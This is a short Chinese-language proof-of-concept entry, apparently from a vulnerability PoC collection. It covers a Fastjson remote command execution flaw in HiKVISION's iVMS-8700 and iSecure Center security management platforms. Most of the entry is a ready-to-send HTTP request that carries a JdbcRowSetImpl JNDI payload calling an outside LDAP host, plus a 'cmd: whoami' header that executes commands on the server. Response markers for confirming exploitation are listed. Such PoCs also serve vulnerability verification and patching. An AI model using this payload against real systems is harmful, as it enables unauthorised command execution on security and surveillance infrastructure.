﻿# HiKVISION 综合安防管理平台远程命令执行漏洞Fastjson

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：V2.0.0 <= iVMS-8700 <= V2.9.2
V1.0.0 <= iSecure Center <= V1.7.0

> 漏洞特征：

> 验证脚本：HTTP

```
POST /bic/ssoService/v1/applyCT HTTP/1.1 
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/json
cmd: whoami

{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://h7nqrs.dnslog.cn/Basic/TomcatEcho","autoCommit":true},"hfe4zyyzldp":"="}
```

> 响应代码特征：-1

> 响应内容特征："code": "0x00215000"

> 上传文件定位：

> 验证文件来源：HiKVISION 综合安防管理平台远程命令执行漏洞Fastjson.poc
